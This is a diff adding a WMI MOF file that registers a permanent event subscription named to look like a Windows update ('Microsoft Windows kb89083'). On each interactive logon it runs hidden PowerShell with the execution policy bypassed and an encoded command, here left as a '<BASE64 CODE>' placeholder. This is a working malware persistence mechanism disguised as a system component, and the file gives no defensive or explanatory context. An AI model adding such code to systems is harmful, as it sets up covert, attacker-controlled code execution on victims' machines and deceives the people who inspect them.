@@ -1,0 +1,25 @@
+#pragma namespace ("\\\\.\\root\\subscription")
+
+instance of CommandLineEventConsumer as $Cons
+{
+    Name = "Microsoft Windows kb89083";
+    RunInteractively=false;
+    CommandLineTemplate="cmd /C powershell -windowstyle hidden -ExecutionPolicy ByPass -EncodedCommand <BASE64 CODE>";
+};
+
+instance of __EventFilter as $Filt
+{
+    Name = "Windows kb89083 filter";
+    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 "
+        "WHERE TargetInstance ISA \"Win32_LogonSession\" "
+        "AND TargetInstance.LogonType = 2";
+    QueryLanguage = "WQL";
+    EventNamespace = "root\\cimv2";
+};
+
+instance of __FilterToConsumerBinding
+{
+    Filter = $Filt;
+    Consumer = $Cons;
+};
+
